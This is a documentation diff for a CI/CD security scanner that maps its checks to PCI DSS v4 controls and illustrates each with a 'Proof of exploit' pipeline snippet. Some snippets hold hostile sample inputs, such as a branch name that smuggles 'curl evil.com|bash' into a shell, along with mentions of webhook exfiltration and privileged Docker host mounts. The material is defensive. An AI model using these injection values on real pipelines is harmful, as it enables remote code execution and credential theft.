@@ -13,7 +13,7 @@ scanner can witness.
 
 - **Controls in this standard:** 13
 - **Controls evidenced by at least one check:** 13 / 13
-- **Distinct checks evidencing this standard:** 616
+- **Distinct checks evidencing this standard:** 619
 - **Of those, autofixable with `--fix`:** 111
 
 _Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._
@@ -25,14 +25,14 @@ Click a control ID to jump to the per-control section with the full check list. 
 | Control | Title | Checks | Severity mix |
 |---------|-------|-------:|--------------|
 | [`6.3.1`](#ctrl-6-3-1) | Security vulnerabilities are identified and managed | 46 | 17C · 9H · 16M · 4L |
-| [`6.3.3`](#ctrl-6-3-3) | All system components protected from known vulnerabilities by installing applicable patches | 147 | 12C · 69H · 61M · 5L |
-| [`6.4.1`](#ctrl-6-4-1) | Public-facing web apps are protected against attacks (secure build/config) | 116 | 20C · 52H · 36M · 8L |
+| [`6.3.3`](#ctrl-6-3-3) | All system components protected from known vulnerabilities by installing applicable patches | 148 | 12C · 70H · 61M · 5L |
+| [`6.4.1`](#ctrl-6-4-1) | Public-facing web apps are protected against attacks (secure build/config) | 117 | 20C · 53H · 36M · 8L |
 | [`6.4.3`](#ctrl-6-4-3) | Changes to systems are managed via documented change control | 63 | 2C · 22H · 32M · 7L |
-| [`6.5.1`](#ctrl-6-5-1) | Changes to system components follow secure development procedures | 287 | 43C · 127H · 97M · 20L |
+| [`6.5.1`](#ctrl-6-5-1) | Changes to system components follow secure development procedures | 290 | 43C · 130H · 97M · 20L |
 | [`7.2.1`](#ctrl-7-2-1) | Access control is defined per job role with least privilege | 19 | 3C · 12H · 3M · 1L |
 | [`7.2.2`](#ctrl-7-2-2) | Access is assigned based on job classification and function | 6 | 2H · 4M |
 | [`7.2.5`](#ctrl-7-2-5) | System and application accounts have least-privilege access | 51 | 7C · 24H · 20M |
-| [`8.2.1`](#ctrl-8-2-1) | Strong unique identifiers are assigned to each user and service account | 86 | 26C · 41H · 17M · 2L |
+| [`8.2.1`](#ctrl-8-2-1) | Strong unique identifiers are assigned to each user and service account | 87 | 26C · 42H · 17M · 2L |
 | [`8.2.2`](#ctrl-8-2-2) | Group, shared, or generic accounts are managed and justified | 9 | 1C · 4H · 4M |
 | [`10.2.1`](#ctrl-10-2-1) | Audit logs are enabled and active for all system components | 31 | 2H · 6M · 7L · 16I |
 | [`10.3.2`](#ctrl-10-3-2) | Audit logs are protected from unauthorized modifications | 51 | 4C · 13H · 33M · 1L |
@@ -110,7 +110,7 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 
 ### 6.3.3: All system components protected from known vulnerabilities by installing applicable patches { #ctrl-6-3-3 }
 
-**Evidenced by 147 checks** across 21 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, NuGet, OCI manifest, PyPI, SCM, Tekton, maven, npm).
+**Evidenced by 148 checks** across 21 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, NuGet, OCI manifest, PyPI, SCM, Tekton, maven, npm).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -191,6 +191,7 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 | [`GHA-091`](#detail-gha-091) | Action upstream repo is missing (takeover-eligible namespace) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-094`](#detail-gha-094) | Action SHA pin matches the current tip of an upstream branch | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-096`](#detail-gha-096) | Action reference has a known GHSA vulnerability | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-100`](#detail-gha-100) | ``cosign verify`` without certificate identity binding | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-009`](#detail-gl-009) | Image pinned to version tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [GitLab CI](../providers/gitlab.md) |  |
@@ -264,7 +265,7 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 
 ### 6.4.1: Public-facing web apps are protected against attacks (secure build/config) { #ctrl-6-4-1 }
 
-**Evidenced by 116 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM, Tekton, Terraform).
+**Evidenced by 117 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM, Tekton, Terraform).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -325,6 +326,7 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 | [`GHA-052`](#detail-gha-052) | actions/cache key includes untrusted PR-controllable input | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-058`](#detail-gha-058) | Agentic CLI invoked with permission-bypass flags | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-092`](#detail-gha-092) | PR head SHA captured then re-fetched (force-push race) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-102`](#detail-gha-102) | ``actions/checkout`` with submodule fetch on a PR trigger | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GL-010`](#detail-gl-010) | Multi-project pipeline ingests upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-011`](#detail-gl-011) | include: local file pulled in MR-triggered pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-012`](#detail-gl-012) | Cache key derives from MR-controlled CI variable | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
@@ -457,7 +459,7 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 
 ### 6.5.1: Changes to system components follow secure development procedures { #ctrl-6-5-1 }
 
-**Evidenced by 287 checks** across 21 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, NuGet, OCI manifest, PyPI, SCM, Tekton, maven, npm).
+**Evidenced by 290 checks** across 21 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, NuGet, OCI manifest, PyPI, SCM, Tekton, maven, npm).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -626,6 +628,8 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 | [`GHA-092`](#detail-gha-092) | PR head SHA captured then re-fetched (force-push race) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-097`](#detail-gha-097) | Recursive PR auto-merge loop | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-099`](#detail-gha-099) | Deployment job has a secret-shaped plaintext env var | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-100`](#detail-gha-100) | ``cosign verify`` without certificate identity binding | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-102`](#detail-gha-102) | ``actions/checkout`` with submodule fetch on a PR trigger | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GL-002`](#detail-gl-002) | Script injection via untrusted commit/MR context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-003`](#detail-gl-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
 | [`GL-006`](#detail-gl-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
@@ -739,6 +743,7 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 | [`TAINT-006`](#detail-taint-006) | Untrusted input flows across tasks via Tekton ``results`` | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
 | [`TAINT-007`](#detail-taint-007) | Untrusted input flows across templates via Argo ``outputs.parameters`` | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
 | [`TAINT-008`](#detail-taint-008) | Untrusted input flows via GitLab ``extends:`` template inheritance | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
+| [`TAINT-009`](#detail-taint-009) | Environment-protected secret flows to unprotected job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`TKN-002`](#detail-tkn-002) | Tekton step runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
 | [`TKN-003`](#detail-tkn-003) | Tekton param interpolated unsafely in step script | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |
 | [`TKN-005`](#detail-tkn-005) | Literal secret value in Tekton step env or param default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
@@ -848,7 +853,7 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 
 ### 8.2.1: Strong unique identifiers are assigned to each user and service account { #ctrl-8-2-1 }
 
-**Evidenced by 86 checks** across 18 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM, Tekton, Terraform, npm).
+**Evidenced by 87 checks** across 18 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM, Tekton, Terraform, npm).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -935,6 +940,7 @@ pipeline_check --pipeline aws --standard pci_dss_v4 --standard owasp_cicd_top_10
 | [`SCM-049`](#detail-scm-049) | Classic PAT used where a fine-grained token suffices | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
 | [`SM-001`](#detail-sm-001) | Secrets Manager secret has no rotation configured | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
 | [`SSM-001`](#detail-ssm-001) | SSM Parameter with secret-like name is not a SecureString | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
+| [`TAINT-009`](#detail-taint-009) | Environment-protected secret flows to unprotected job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`TF-001`](#detail-tf-001) | Plan declares aws_iam_access_key (long-lived credential) | <span class="pg-sev pg-sev--high">HIGH</span> | [Terraform](../providers/terraform.md) |  |
 | [`TF-002`](#detail-tf-002) | Stateful data-store resource carries a plaintext secret | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Terraform](../providers/terraform.md) |  |
 | [`TKN-005`](#detail-tkn-005) | Literal secret value in Tekton step env or param default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
@@ -1078,7 +1084,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``AzureCLI@2`` resolves to whatever
 # Microsoft ships as version 2 at job-start time. A
 # Microsoft-pushed update silently changes the task body;
@@ -1117,7 +1123,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: PR title macro interpolated straight into script.
 trigger: none
 pr:
@@ -1164,7 +1170,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the AWS access key literal lives in the
 # pipeline ``variables:`` block. The YAML is committed
 # to git, printed in build logs when the step echoes
@@ -1211,7 +1217,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a container resource pinned to a mutable
 # tag. The publisher (or anyone with publish access)
 # repoints the tag on the next refresh; every pipeline
@@ -1273,11 +1279,11 @@ jobs:
 
 **Known false positives.**
 
-- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, vendor example keys). Well-known vendor example tokens (``AKIAIOSFODNN7EXAMPLE``, Stripe ``sk_test_`` docs keys) are suppressed via the ``VENDOR_EXAMPLE_TOKENS`` allowlist. Defaults to LOW confidence.
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a credential-shaped literal anywhere in
 # the pipeline body (job env, task input, inline script)
 # leaks the same way as ADO-003 — committed to git,
@@ -1321,7 +1327,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``download:`` pulls artifacts from another
 # pipeline in the same project. If that upstream pipeline
 # accepts PR-validated builds, the artifact may have been
@@ -1366,7 +1372,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the pipeline includes a local template that
 # any PR can modify, on a PR-validated pipeline. An MR
 # can rewrite ``ci/build.yml`` and have its own version
@@ -1460,7 +1466,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl | bash`` in a script step trusts
 # both the network path and the installer host. A MITM
 # or compromised endpoint ships malicious code into the
@@ -1493,7 +1499,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``docker run --privileged`` plus the host
 # Docker socket gives the build container full kernel
 # access and the agent's runtime. A compromise escapes
@@ -1527,7 +1533,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip resolves and downloads packages over
 # plaintext HTTP. ``--trusted-host`` silences hash
 # verification for the named host, so an attacker on the
@@ -1560,7 +1566,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: PR-validated pipeline extends a LOCAL template.
 trigger: none
 pr:
@@ -1649,7 +1655,7 @@ extends:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``npm config set strict-ssl false`` disables
 # certificate verification for every subsequent npm call.
 # A network attacker MITMs the registry and ships
@@ -1690,7 +1696,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ref: refs/heads/main`` on a cross-repo
 # template is mutable. Whoever can push to ``main`` on
 # ``ci-templates`` ships code into every consumer's
@@ -1735,7 +1741,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a step body executes a base64-decoded
 # payload, exfils to ``webhook.site``, or runs a
 # known miner binary. A malicious PR (or compromised
@@ -1772,7 +1778,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``eval "$BUILD_CMD"`` on a value that came
 # from a variable group / runtime parameter gives the
 # value full shell-grammar reach. ``sh -c $RAW`` on an
@@ -1818,7 +1824,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a service-connection-using job runs on any
 # branch (PR builds included) without an environment
 # gate. The OIDC role's trust policy accepts any token
@@ -1873,7 +1879,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pool name computed from caller-controlled parameter.
 parameters:
   - name: targetPool
@@ -1922,7 +1928,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``alpine:3.18`` is a mutable tag. The Alpine
 # maintainers (or a registry compromise / namespace hijack)
 # repoint the tag on the next 3.18.x point release; every
@@ -1964,7 +1970,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``privileged: true`` gives the container full
 # access to the node's devices and capabilities. A workload
 # compromise (poisoned image, build-script RCE) becomes a
@@ -2021,7 +2027,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``hostPath: /var/run/docker.sock`` mounts the
 # Docker socket into the template's container. The workflow
 # can then ``docker run --privileged -v /:/host ...`` and
@@ -2076,7 +2082,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: webhook-triggered workflow interpolates a
 # user-supplied parameter directly into a shell script.
 apiVersion: argoproj.io/v1alpha1
@@ -2134,7 +2140,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the AWS access key literal lives in the
 # WorkflowTemplate manifest, committed to git and readable
 # by every namespace member with workflowtemplates: get on
@@ -2198,7 +2204,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl | bash`` trusts both the network path
 # (any MITM substitutes the script) and the host (an
 # attacker-compromised installer endpoint silently serves
@@ -2326,7 +2332,7 @@ Other artifact sources are skipped, an OCI / S3 / GCS pull carries its own integ
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``http://`` artifact URL means Argo fetches
 # the input over plaintext. Any on-path attacker (compromised
 # corporate proxy, malicious VPN, BGP hijack on the internal
@@ -2386,7 +2392,7 @@ Triggering this rule means the bytes of the runtime image were produced by a bui
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the SLSA provenance attestation names a
 # self-hosted builder whose isolation cannot be audited
 # publicly. The signed attestation only attests that *this*
@@ -2452,7 +2458,7 @@ Fires when:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``configSource.uri`` is empty (or 'unknown' /
 # 'n/a' / a placeholder). The trusted builder produced and
 # signed an attestation but the source-repo claim is
@@ -2535,7 +2541,7 @@ Pairs with ATTEST-003: ATTEST-003 verifies the SBOM covers package-level inputs,
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a hand-rolled or older-Buildx provenance
 # emitter ships a Statement whose materials list is empty.
 # (Modern BuildKit ``--attest=type=provenance`` populates a
@@ -2607,7 +2613,7 @@ Hex validation is conservative: the value must consist entirely of ``0-9`` and `
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Statement signed by a trusted builder but
 # carrying an empty subject digest. The signature is valid;
 # the bind to the image bytes is not.
@@ -2671,7 +2677,7 @@ Doesn't validate that the URI is reachable or that the schema it names is one a 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a self-rolled SLSA generator that omits the
 # buildType field. The predicate carries every other
 # claim (builder, materials, configSource) but consumers
@@ -2747,7 +2753,7 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``atlassian/aws-s3-deploy:1`` resolves to
 # whatever the publisher's latest 1.x image is at job
 # start. A publisher takeover (compromised Atlassian
@@ -2788,7 +2794,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: branch name interpolated unquoted into shell.
 image: alpine:latest
 pipelines:
@@ -2836,7 +2842,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: literal AWS access key in pipeline-level
 # ``variables:``. The ``bitbucket-pipelines.yml`` is
 # committed to git; the build log echoes the value on
@@ -2919,11 +2925,11 @@ pipelines:
 
 **Known false positives.**
 
-- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, vendor example keys). Well-known vendor example tokens (``AKIAIOSFODNN7EXAMPLE``, Stripe ``sk_test_`` docs keys) are suppressed via the ``VENDOR_EXAMPLE_TOKENS`` allowlist. Defaults to LOW confidence.
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a credential-shaped literal anywhere in
 # the pipeline body (step env, inline script, after-
 # script body). Anyone with repo read sees it; build
@@ -2969,7 +2975,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a deploy step consumes ``build`` artifacts
 # produced by a PR-triggered build step. A fork PR's
 # build step uploads anything as ``build``; the deploy
@@ -3039,7 +3045,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl | bash`` install one-liner. A MITM
 # (compromised corporate proxy) or a hijacked installer
 # endpoint ships malicious code into the step's shell
@@ -3075,7 +3081,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``docker run --privileged`` plus the host
 # Docker socket inside a Bitbucket step. The step is
 # already a container; granting it privileged access
@@ -3114,7 +3120,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip uses a plaintext-HTTP index and
 # ``--trusted-host`` silences hash verification on the
 # named host. A network attacker swaps wheels in flight.
@@ -3171,7 +3177,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``BITBUCKET_REPO_ACCESS_TOKEN`` written to
 # a file or piped to ``tee`` for downstream steps. The
 # token is meant to live only for the step's duration;
@@ -3221,7 +3227,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``after-script`` runs even when the main
 # script fails. Echoing a secret env var here lands the
 # value in the build log on every failed build — which
@@ -3299,7 +3305,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``npm config set strict-ssl false`` (or
 # ``git config http.sslverify false`` / ``NODE_TLS_
 # REJECT_UNAUTHORIZED=0``) disables certificate
@@ -3352,7 +3358,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a step body executes a base64-decoded
 # payload, exfils to a third-party webhook, or runs a
 # known miner binary. A malicious PR (or a compromised
@@ -3392,7 +3398,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``eval`` on a variable that came from a
 # pipeline variable / deployment env gives that value
 # full shell-grammar reach. ``sh -c $RAW`` on an
@@ -3436,7 +3442,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an OIDC step (``oidc: true``) runs on every
 # trigger, including pull-request builds. The OIDC role's
 # trust policy accepts any token from the repo, so a
@@ -3481,7 +3487,7 @@ pipelines:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``image: python:3.12-slim`` is a mutable
 # tag. Docker Hub's image team rebuilds it on every
 # Python point release; a publisher takeover ships code
@@ -3557,7 +3563,7 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``docker-compose#main`` resolves at agent
 # boot to whatever sits at the plugin repo's main branch.
 # A push to the plugin repo (legitimate maintainer commit,
@@ -3597,7 +3603,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the AWS access key literal lives in
 # ``pipeline.yml``. The file is committed to git, visible
 # to anyone with repo read access, and printed in build
@@ -3639,7 +3645,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an MR whose branch is named
 # ``feat;curl evil.com|bash;#`` lands the metacharacters
 # into the shell verbatim. The injected ``curl`` runs in
@@ -3675,7 +3681,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl | bash`` trusts both the network path
 # (any MITM substitutes the script) and the host (a
 # compromised installer endpoint silently serves attacker
@@ -3713,7 +3719,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``--privileged`` plus the host Docker socket
 # gives the build container full access to the agent's
 # kernel and the runtime that started it. A compromise
@@ -3870,7 +3876,7 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``queue: $BUILDKITE_BRANCH`` lets the pusher
 # decide which agent pool runs their step. A PR branch
 # named ``production`` routes its build to the production
@@ -3926,7 +3932,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a CodeArtifact repository wired to a public
 # upstream (npm.org / pypi.org / maven-central) without
 # allow-listing. Internal package names harvested from
@@ -3967,7 +3973,7 @@ ca.disassociate_external_connection(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: CodeArtifact domain policy with
 # ``Principal: '*'`` and no condition. Any AWS principal
 # in any account can pull artifacts from the domain;
@@ -4010,7 +4016,7 @@ ca.disassociate_external_connection(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``codeartifact:*`` on ``Resource: *``. The
 # bound principal can DeleteRepository,
 # DisposePackageVersions, UpdatePackageVersionsStatus
@@ -4059,7 +4065,7 @@ ca.disassociate_external_connection(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: CodeBuild project with a plaintext PAT in env.
 {
   "name": "deploy",
@@ -4109,7 +4115,7 @@ ca.disassociate_external_connection(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``privilegedMode: true`` on a CodeBuild
 # project gives the build container privileged Docker
 # access on the build host. A poisoned buildspec or a
@@ -4189,7 +4195,7 @@ cb.update_project(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: CodeBuild source auth uses a stored
 # long-lived token (``OAUTH`` / ``PERSONAL_ACCESS_TOKEN``
 # / ``BASIC_AUTH``). The credential lives on the account
@@ -4242,7 +4248,7 @@ cb.update_project(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``buildspec`` is inline JSON on the
 # project, not sourced from a protected repo. Anyone
 # with ``codebuild:UpdateProject`` (or who can call the
@@ -4293,7 +4299,7 @@ cb.update_project(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the CodeBuild webhook filter accepts
 # ``PULL_REQUEST_CREATED`` / ``PULL_REQUEST_UPDATED``
 # events from any actor. A fork PR triggers the build
@@ -4340,7 +4346,7 @@ cb.update_webhook(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the project's buildspec carries indicators
 # of malicious activity — base64-decoded execution, exfil
 # to webhook.site, miner binaries. Either the buildspec
@@ -4379,7 +4385,7 @@ phases:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``circleci/aws-cli@volatile`` (or any non-
 # semver ref) resolves at config-process time to whatever
 # the orb publisher last pushed. A compromised publisher
@@ -4410,7 +4416,7 @@ orbs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a branch named ``feat;curl evil|bash;``
 # lands in the shell verbatim via ``$CIRCLE_BRANCH``. The
 # injected ``curl`` runs in the step's shell with the
@@ -4452,7 +4458,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``cimg/python:3.12`` is a mutable tag.
 # CircleCI's image team rebuilds it on every Python
 # point release; a publisher compromise ships code into
@@ -4531,11 +4537,11 @@ jobs:
 
 **Known false positives.**
 
-- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, vendor example keys). Well-known vendor example tokens (``AKIAIOSFODNN7EXAMPLE``, Stripe ``sk_test_`` docs keys) are suppressed via the ``VENDOR_EXAMPLE_TOKENS`` allowlist. Defaults to LOW confidence.
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the AWS access key literal lives in
 # ``environment:``. The config file is committed to git
 # and printed in build logs whenever the step echoes its
@@ -4659,7 +4665,7 @@ workflows:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl | bash`` install one-liner trusts
 # both the network path and the installer host. A MITM
 # or compromised endpoint ships malicious code into the
@@ -4701,7 +4707,7 @@ jobs:
 
